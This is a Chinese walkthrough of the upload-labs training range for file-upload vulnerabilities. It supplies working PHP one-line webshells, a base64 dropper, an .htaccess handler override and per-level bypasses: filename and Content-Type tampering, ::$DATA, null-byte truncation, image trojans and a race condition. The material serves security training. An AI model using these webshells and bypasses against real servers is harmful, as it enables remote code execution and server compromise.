文件上传靶场。

# 1 部署

下载

```shell
[root@centos ~]# git clone https://github.com/c0ny1/upload-labs.git
```

准备

`webshell.php`

```php
<?php @eval($_POST[um931o]);?>
```

> 可执行任意代码的 PHP 文件

`.htaccess`

```htaccess
<FilesMatch "webshell.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

> 此配置文件将同一文件夹下名为 `webshell.jpg` 的文件视为 PHP 文件来执行

`shell.php`

```php
<?php
$code='PD9waHAgQGV2YWwoJF9QT1NUW3VtOTMxb10pOz8+';
$myfile = fopen("shell.php", "w");
fwrite($myfile, base64_decode($code));
fclose($myfile);
?>
```

> 将用 base64 编码的一句话木马解码并写入到生成的 shell.php 文件

# 2 使用

访问

> http://centos7-6.local/upload-labs/

## 2.1 Pass-01

**修改后缀名绕过**

修改 `webshell.php` 的后缀名为 `webshell.jpg`

打开拦截，修改请求数据包中的 `filename="webshell.jpg"` 为 `filename="webshell.php"` 

关闭拦截即可将 `webshell.php` 上传至目标服务器

右键缩略图复制图片地址到地址栏访问 `webshell.php` 

 在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

## 2.2 Pass-02

### 2.2.1 方法一 修改后缀名绕过

修改 `webshell.php` 的后缀名为 `webshell.jpg`

打开拦截，修改请求数据包中的 `filename="webshell.jpg"` 为 `filename="webshell.php"` 

关闭拦截即可将 `webshell.php` 上传至目标服务器

右键缩略图复制图片地址到地址栏访问 `webshell.php` 

 在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

### 2.2.2 方法二修改 Content-type 绕过

打开拦截，上传 `webshell.php` ，将 `Content-Type: application/octet-stream` ,修改为 `Content-Type: image/jpeg`

注意有两个 `Content-Type` ，第二个才是，注意识别

![注意有两个 Content-Type ，第二个才是，注意识别](./../../../../images/upload-labs/%E6%B3%A8%E6%84%8F%E6%9C%89%E4%B8%A4%E4%B8%AA%20Content-Type%20%EF%BC%8C%E7%AC%AC%E4%BA%8C%E4%B8%AA%E6%89%8D%E6%98%AF%EF%BC%8C%E6%B3%A8%E6%84%8F%E8%AF%86%E5%88%AB.png)

> 第一个是表单的  `Content-Type` 
>
> 第二个才是我们要修改的附件的  `Content-Type` 

修改之后关闭拦截，右键缩略图复制图片地址到地址栏访问 `webshell.php` 

 在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

## 2.3 Pass-03 .htaccess 配置访问绕过

上传 `.htaccess` ，修改 `webshell.php` 后缀名为 `webshell.jpg` ,再上传 `webshell.jpg`，（此时访问 `webshell.jpg` 会以 php 文件的方式访问） 在访问 `webshell.jpg` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

## 2.4 Pass-04

### 2.4.1 方法一 .htaccess 配置访问绕过

上传 `.htaccess` ，修改 `webshell.php` 后缀名为 `webshell.jpg` ,再上传 `webshell.jpg`，（此时访问 `webshell.jpg` 会以 php 文件的方式访问） 在访问 `webshell.jpg` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

### 2.4.2 方法二 文件重写绕过


利用 PHP 和 Windows 环境的叠加特性，以下符号在正则匹配时的相等性：

> 双引号" = 点号.
> 大于符号> = 问号?
> 小于符号< = 星号*

#### 2.4.2.1 (1) :.jpg 绕过

打开拦截，将 `filename="webshell.php"` 修改为 `filename="webshell.php:.jpg"` ，关闭拦截，即可将 `webshell.php` 上传至目标服务器，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

> 当向 Windows 上传一个名为 `webshell.php:.jpg` 的文件时,由于 Windows 系统的限制,它会自动去掉文件名中的 `:` 字符,因此上传后的文件名会变成 `webshell.php.jpg`

#### 2.4.2.2 (2) :.jpg + 追加绕过

创建一个空文件 `hello.php` ，打开拦截，修改文件名为 `filename="hello.php:.jpg"`，关闭拦截，即可将 `hello.php` ，上传至目标服务器，再开启拦截，上传 `webshell.php` ，修改文件名为 `filename="hello.<"` ，即可将 `webshell,php` 的内容追加到 `hello.php` ，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

> 此外追加符号可以使用：`<` 或 `<<<` 或 `>>>` 或 `>><`

## 2.5 Pass-05

打开拦截，将 `filename="webshell.php"` 修改为 `filename="webshell.php:.jpg"` ，关闭拦截，即可将 `webshell.php` 上传至目标服务器，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` ，将 `webshell.php` 上传至目标服务器发现  `webshell.php` 的内容为空

### 2.5.1 方法一 :.jpg + 追加绕过

创建一个空文件 `hello.php` ，打开拦截，修改文件名为 `filename="hello.php:.jpg"`，关闭拦截，即可将 `hello.php` ，上传至目标服务器，再开启拦截，上传 `webshell.php` ，修改文件名为 `filename="hello.<"` ，即可将 `webshell,php` 的内容追加到 `hello.php` ，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

> 此外追加符号可以使用：`<` 或 `<<<` 或 `>>>` 或 `>><`

### 2.5.2 方法二 大小写绕过

开启拦截，直接上传文件 `webshell.php` ，将 `filename="webshell.php"` 修改为 `filename="webshell.Php"` ，关闭拦截访问即可

> 利用了 Windows 的忽略大小写绕过，若是 Linux 则无法用此方法绕过

## 2.6 Pass-06

打开拦截，将 `filename="webshell.php"` 修改为 `filename="webshell.php:.jpg"` ，关闭拦截，即可将 `webshell.php` 上传至目标服务器，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` ，将 `webshell.php` 上传至目标服务器发现  `webshell.php` 的内容为空

### 2.6.1 方法一 追加绕过

创建一个空文件 `hello.php` ，打开拦截，修改文件名为 `filename="hello.php：.jpg"`，关闭拦截，即可将 `hello.php` ，上传至目标服务器，再开启拦截，上传 `webshell.php` ，修改文件名为 `filename="hello.<"` ，即可将 `webshell,php` 的内容追加到 `hello.php` ，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

> 此外追加符号可以使用：`<` 或 `<<<` 或 `>>>` 或 `>><`

### 2.6.2 方法二 空格绕过

打开拦截，将 `filename="webshell.php"` 修改为 `filename="webshell.php "` （在后面加一个空格），关闭拦截，即可将 `webshell.php` 上传至目标服务器，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

> 利用空格，删除了一个过滤函数，trim()函数，移除字符串两侧多余的空白 字符或其他预定义字符。

## 2.7 Pass-07 点绕过

打开拦截，将 `filename="webshell.php"` 修改为 `filename="webshell.php."` （在后面加一个点），关闭拦截，即可将 `webshell.php` 上传至目标服务器，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

>Windows 会自动去掉后缀名后面的 `.`

## 2.8 Pass-08 Windows 数据流绕过

打开拦截，将 `filename="webshell.php"` 修改为 `filename="webshell.php::$DATA"` （在后面加一个::$DATA），关闭拦截，即可将 `webshell.php` 上传至目标服务器，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

>Windows 会自动去掉后缀名后面的 `::$DATA`

## 2.9 Pass-09 嵌套绕过

打开拦截，将 `filename="webshell.php"` 修改为 `filename="webshell.php. ."` （在后面加点空格点即可），关闭拦截，即可将 `webshell.php` 上传至目标服务器，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

>Windows 会自动去掉后缀名后面的 `. .`

## 2.10 Pass-10 双写绕过

打开拦截，将 `filename="webshell.php"` 修改为 `filename="webshell.pphphp"` （在后面加点空格点即可），关闭拦截，即可将 `webshell.php` 上传至目标服务器，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

>目标服务器会自动过滤 `php`

## 2.11 Pass-11 00 截断绕过

00 截断必须要求：

> php 版本为 5.2（5.2 版本所有关卡都可以做，但是无法连接蚁剑）
>
> php-ini 的 magic_quotes_gpc 为 OFF 状态，修改后重启生效。

打开拦截，将 `save_path=../upload/` 修改为 `save_path=../upload/webshell.php%00`，`filename="webshell.jpg"` 不变，关闭拦截，即可将 `webshell.php` 上传至目标服务器，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

>1. filename参数设置的文件名是webshell.jpg,看似是一个jpg图片。
>2.  但是save_path参数中的../upload/webshell.php%00,使用了NULL字节%00截断。
>3.  该NULL字节之后的数据都会被忽略,所以上传的真实文件名是webshell.php。
>4.  服务器在保存上传文件时,是根据save_path中的文件名来保存的。
>5.  而filename中的名仅用于显示,不影响真正的文件名。
>6.  所以NULL字节截断了.jpg,使得保存的文件为webshell.php。
>7.  由于该文件包含PHP代码,上传后成为一个后门文件。

## 2.12 Pass-12 十六进制 00 截断绕过

打开拦截，在 `Content-Disposition: form-data; name="save_path"` 下放修改 `../upload/` 为 `../upload/webshell.php .jpg` ，切换到 16 进制格式（Hex），将 `../upload/webshell.php .jpg` 中的空格的 Hex 修改为 `00`

（切记修改完要回车）关闭拦截，即可将 `webshell.php` 上传至目标服务器，在访问 `webshell.php` 时打开 `HackBar` ,提交 Use POST method 为  `xuegod=phpinfo();` 即可

## 2.13 Pass-13

此关无法利用，仅绕过

### 2.13.1 方法一 图片马绕过

使图片文件和木马文件在一个文件夹下，在此文件夹下打开 cmd

合并生成新文件

```
G:\>copy xuegod.jpg/b + webshell.php/a hello.jpg
```

> 此时生成的 hello.jpg 含有 webshell.php 的代码

上传 `hello.jpg` 即可

### 2.13.2 方法二 文件标识头绕过

在 `webshell.php` 中的首部插入 GIF 的文件标识头 `GIF89a` ，如下

```
GIF89a
<?php @eval($_POST[xuegod]);?>
```

> GIF89a 表示此文件为 GIF 文件，上传即可

## 2.14 Pass-14

此关无法利用，仅绕过

### 2.14.1 方法一 图片马绕过

使图片文件和木马文件在一个文件夹下，在此文件夹下打开 cmd

合并生成新文件

```
G:\>copy xuegod.jpg/b + webshell.php/a hello.jpg
```

> 此时生成的 hello.jpg 含有 webshell.php 的代码

上传 `hello.jpg` 即可

### 2.14.2 方法二 文件标识头绕过

在 `webshell.php` 中的首部插入 GIF 的文件标识头 `GIF89a` ，如下

```
GIF89a
<?php @eval($_POST[xuegod]);?>
```

> GIF89a 表示此文件为 GIF 文件，上传即可
>
> 仅可上传 GIF

## 2.16 Pass-16 二次渲染绕过

准备一张 GIF 图片上传至目标服务器，再将服务器保存的图片下载到本地，用 Hex Editor 对比两个文件，将代码插入到没有变化的位置，重命名后上传即可

## 2.17 Pass-17 条件竞争

开启拦截，上传 `for shell.php`，在拦截到的请求数据包中右键发送到 `Intruder` 

![右键发送到Intruder](./../../../../images/upload-labs/%E5%8F%B3%E9%94%AE%E5%8F%91%E9%80%81%E5%88%B0Intruder.png)

清除所有 payload 标记

![清除所有 payload 标记](./../../../../images/upload-labs/%E6%B8%85%E9%99%A4%E6%89%80%E6%9C%89%20payload%20%E6%A0%87%E8%AE%B0.png)

进入 payload 配置

![进入 payload 配置](./../../../../images/upload-labs/%E8%BF%9B%E5%85%A5%20payload%20%E9%85%8D%E7%BD%AE.png)

> 选择 Null payloads，无限重复，取消勾选编码

关闭拦截，再次打开拦截，访问

> http://192.168.1.102/upload-labs/upload/for%20shell.php
>
> %20 为空格的 URL 编码

再次在拦截到的请求数据包中右键发送到 Intruder，重复以上配置

点击开始攻击，成功后会将 `shell.php` 文件写入到目标服务器。在访问 `shell.php` 时打开 `HackBar` ,提交 Use POST method 为 `xuegod=phpinfo();` 即可

## 2.18 Pass-18 图片马绕过

同 Pass-14 方法一

## 2.19 Pass-19 图片马绕过

同 Pass-14 方法一

---

参考链接

- [upload-labs](https://github.com/c0ny1/upload-labs)
